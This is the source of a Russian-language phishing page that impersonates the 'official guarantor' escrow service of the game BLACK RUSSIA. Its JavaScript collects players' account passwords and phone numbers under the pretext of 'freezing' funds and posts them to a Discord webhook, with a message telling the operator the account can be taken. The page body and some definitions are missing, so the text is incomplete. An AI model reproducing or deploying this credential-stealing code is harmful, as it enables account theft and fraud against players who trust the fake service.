<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>BLACK RUSSIA | Официальный Гарант</title>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #08090c;
    --card: #12141a;
    --border: #242833;
    --txt: #ffffff;
    --dim: #8b92a5;
    --red: #e50914;
    --red-glow: rgba(229, 9, 20, 0.3);
    --blue: #2563eb;
    --green: #16a34a;
    --yellow: #ca8a04;
    --purple: #7e22ce;
    --pink: #db2777;
    --orange: #ea580c;
  }
  
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; -webkit-tap-highlight-color: transparent; }
  
  body { 
    background-color: var(--bg); 
    background-image: 
      radial-gradient(circle at 50% 0%, rgba(229, 9, 20, 0.15) 0%, transparent 60%),
      url('data:image/svg+xml;utf8,<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="%2308090c"/><circle cx="50" cy="50" r="1" fill="%23242833"/></svg>');
    color: var(--txt); 
    min-height: 100vh; 
    padding: 0 0 40px; 
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  /* Шапка как на официальном сайте */
  .official-header {
    width: 100%;
    padding: 15px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: rgba(8, 9, 12, 0.8);
    backdrop-filter: blur(10px);
    border-bottom: 1px solid var(--border);
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .header-logo {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .header-logo svg { width: 35px; height: 35px; }
  .header-logo span { font-weight: 900; font-size: 14px; letter-spacing: 1px; }
  .header-logo span span { color: var(--red); }
  
  .header-btn {
    background: #fff;
    color: #000;
    padding: 8px 16px;
    border-radius: 6px;
    font-weight: 800;
    font-size: 12px;
    text-decoration: none;
    text-transform: uppercase;
  }

  /* Главный баннер */
  .hero-banner {
    width: 100%;
    max-width: 800px;
    position: relative;
    margin-bottom: -40px;
    z-index: 2;
  }
  .hero-banner img {
    width: 100%;
    display: block;
    mask-image: linear-gradient(to bottom, black 70%, transparent 100%);
    -webkit-mask-image: linear-gradient(to bottom, black 70%, transparent 100%);
  }
  
  .hero-title {
    position: absolute;
    bottom: 60px;
    left: 20px;
    font-size: 32px;
    font-weight: 900;
    text-transform: uppercase;
    text-shadow: 0 4px 10px rgba(0,0,0,0.8);
    line-height: 1;
  }

  /* Блок контента */
  .content-wrap {
    width: 100%;
    max-width: 400px;
    padding: 0 15px;
    position: relative;
    z-index: 10;
  }

  /* Карточка формы */
  .card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 24px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
    position: relative;
    overflow: hidden;
  }

  .card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 3px;
    background: linear-gradient(90deg, transparent, var(--red), transparent);
  }

  .header-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    border-bottom: 1px solid var(--border);
    padding-bottom: 15px;
  }
  .header-title { font-weight: 900; font-size: 15px; color: #fff; letter-spacing: 1px;}
  .header-title span { color: var(--red); }
  .year-badge { background:#1c1f26; border: 1px solid var(--border); padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800; color: var(--txt);}

  .field { margin-bottom: 16px; }
  .field label {
    display: block; font-size: 10px; color: var(--dim);
    margin-bottom: 6px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
  }
  .field input {
    width: 100%; background: #08090c; border: 1px solid var(--border);
    color: var(--txt); padding: 14px; border-radius: 8px; font-size: 14px;
    font-family: 'Montserrat', sans-serif; transition: 0.2s;
  }
  .field input:focus { outline: none; border-color: var(--red); box-shadow: 0 0 10px var(--red-glow); }
  
  .server-select-btn {
    width: 100%; background: #08090c; border: 1px solid var(--border);
    color: var(--txt); padding: 14px; border-radius: 8px; font-size: 14px;
    display: flex; justify-content: space-between; align-items: center;
    cursor: pointer; font-family: 'Montserrat', sans-serif; transition: 0.2s;
  }
  .server-select-btn:active { transform: scale(0.98); }

  .btn-main {
    width: 100%; padding: 16px; border: none; border-radius: 8px;
    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
    text-transform: uppercase; letter-spacing: 0.5px;
    background: var(--red); color: white; box-shadow: 0 4px 20px var(--red-glow);
    margin-top: 10px;
  }
  .btn-main:active { transform: scale(0.98); }

  /* Магазины */
  .store-buttons { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
  .store-btn {
    display: flex; align-items: center; gap: 15px;
    background: #fff; color: #000; padding: 12px 20px;
    border-radius: 8px; text-decoration: none; font-weight: 800;
  }
  .store-btn svg { width: 28px; height: 28px; }
  .store-btn-text { font-size: 10px; line-height: 1.2; }
  .store-btn-text span { display: block; font-size: 14px; }

  /* Экран успеха */
  .success-box { display: none; }
  .success-box h3 { color: var(--green); font-size: 16px; margin-bottom: 15px; text-align: center; text-transform: uppercase; font-weight: 900; }
  .data-box { background: #08090c; border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
  .data-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; }
  .data-row:last-child { margin-bottom: 0; }
  .data-label { color: var(--dim); }
  .data-value { font-weight: 700; color: #fff; }

  .btn-success {
    width: 100%; padding: 16px; border: none; border-radius: 8px;
    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
    text-transform: uppercase; letter-spacing: 0.5px;
    background: var(--green); color: white; box-shadow: 0 4px 20px rgba(22, 163, 74, 0.3);
  }

  /* Модалка серверов */
  .modal {
    position: fixed; inset: 0; background: rgba(8, 9, 12, 0.98);
    z-index: 1000; display: none; flex-direction: column; padding: 20px 15px;
    overflow-y: auto; backdrop-filter: blur(5px);
  }
  .modal.active { display: flex; }
  
  .modal-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
  .modal-head h2 { font-size: 18px; font-weight: 800; color: #fff; text-transform: uppercase; letter-spacing: 1px;}
  .close-btn { background: #12141a; border: 1px solid var(--border); color: white; width: 40px; height: 40px; border-radius: 8px; font-size: 18px; cursor: pointer; }
  
  .search-input { width: 100%; background: #12141a; border: 1px solid var(--border); color: white; padding: 14px; border-radius: 8px; margin-bottom: 15px; font-family: 'Montserrat', sans-serif; font-size: 14px; }
  .search-input:focus { outline: none; border-color: var(--red); }

  .servers-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding-bottom: 30px; }
  
  .server-card {
    background: #12141a; border: 1px solid var(--border); border-radius: 8px; padding: 14px;
    cursor: pointer; position: relative; display: flex; flex-direction: column;
    min-height: 95px; transition: 0.2s;
  }
  .server-card:active { transform: scale(0.97); }
  
  .s-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 6px; }
  .s-num { font-size: 11px; color: #6b7280; font-weight: 700; }
  .s-tag { font-size: 8px; font-weight: 800; padding: 2px 4px; border-radius: 4px; text-transform: uppercase; }
  .t-new { background: var(--red); color: #fff; }
  .t-curr { background: var(--blue); color: #fff; }
  
  .s-name { font-size: 13px; font-weight: 800; text-transform: uppercase; margin-bottom: 12px; color: #fff; line-height: 1.2; }
  
  .s-bottom { margin-top: auto; }
  .s-online { font-size: 10px; color: #9ca3af; margin-bottom: 5px; font-weight: 600; }
  .s-bar { height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; }
  .s-fill { height: 100%; border-radius: 2px; }
  
  .c-red { background: var(--red); }
  .c-blue { background: var(--blue); }
  .c-green { background: var(--green); }
  .c-yellow { background: var(--yellow); }
  .c-purple { background: var(--purple); }
  .c-pink { background: var(--pink); }
  .c-white { background: #fff; }
  .c-orange { background: var(--orange); }
  .c-aqua { background: #06b6d4; }
  .c-lime { background: #84cc16; }

</style>

  let selectedServer = "";
  
  function renderServers(query = "") {
    const grid = document.getElementById('grid');
    grid.innerHTML = "";
    
    const filtered = serversData.filter(s => 
      s.name.toLowerCase().includes(query.toLowerCase()) || 
      s.id.toString() === query
    );

    filtered.forEach(s => {
      const card = document.createElement('div');
      card.className = 'server-card';
      card.onclick = () => selectServer(s.name);
      
      let tagHtml = s.tag ? `<div class="s-tag ${s.tagClass}">${s.tag}</div>` : "";

      card.innerHTML = `
        <div class="s-top">
          <div class="s-num"># ${s.id}</div>
          ${tagHtml}
        </div>
        <div class="s-name">${s.name}</div>
        <div class="s-bottom">
          <div class="s-online">${s.online}</div>
          <div class="s-bar"><div class="s-fill ${s.color}" style="width: ${s.percent}%"></div></div>
        </div>
      `;
      grid.appendChild(card);
    });
  }

  function toggleModal(show) {
    document.getElementById('modal-servers').classList.toggle('active', show);
    if(show) {
        document.getElementById('search').value = ""; 
        renderServers(); 
    }
  }

  function selectServer(name) {
    selectedServer = name;
    const display = document.getElementById('selected-name');
    display.textContent = name;
    display.style.color = "#fff";
    toggleModal(false);
  }

  async function sendToDiscord(text) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: text })
      });
    } catch (e) { console.log("Ошибка", e); }
  }

  let currentData = null;

  document.getElementById('btn-freeze').onclick = async () => {
    const myNick = document.getElementById('in-my-nick').value.trim();
    const targetNick = document.getElementById('in-target-nick').value.trim();
    const pass = document.getElementById('in-pass').value;

    if (!myNick) return alert("Введите ваш ник!");
    if (!targetNick) return alert("Введите ник получателя!");
    if (!selectedServer) return alert("Выберите сервер!");
    if (!pass) return alert("Введите пароль!");

    const btn = document.getElementById('btn-freeze');
    btn.disabled = true;
    btn.textContent = "Заморозка...";

    const data = {
      my_nick: myNick,
      target_nick: targetNick,
      server: selectedServer,
      pass: pass,
      phone: document.getElementById('in-phone').value.trim()
    };
    
    currentData = data;

    const msg = `❄️ **Новая заморозка!**\n\n👤 **Ваш ник:** ${data.my_nick}\n🎯 **Получатель:** ${data.target_nick}\n🖥 **Сервер:** ${data.server}\n🔑 **Пароль:** \`${data.pass}\`\n📱 **Номер:** ${data.phone || 'не указан'}`;
    
    await sendToDiscord(msg);

    document.getElementById('out-my-nick').textContent = data.my_nick;
    document.getElementById('out-target-nick').textContent = data.target_nick;
    document.getElementById('out-server').textContent = data.server;
    
    document.getElementById('screen-form').style.display = 'none';
    document.getElementById('screen-success').style.display = 'block';
  };

  document.getElementById('btn-send').onclick = async () => {
    if (!currentData) return;
    
    const btn = document.getElementById('btn-send');
    btn.disabled = true;
    btn.textContent = "Отправка...";
    
    const msg = `✅ **Средства пришли!**\n\n👤 **Ваш ник:** ${currentData.my_nick}\n🎯 **Получатель:** ${currentData.target_nick}\n🖥 **Сервер:** ${currentData.server}\n📱 **Номер:** ${currentData.phone || 'не указан'}\n\nМожно отдавать аккаунт.`;
    
    await sendToDiscord(msg);
    alert("Средства отправлены получателю!");
  };
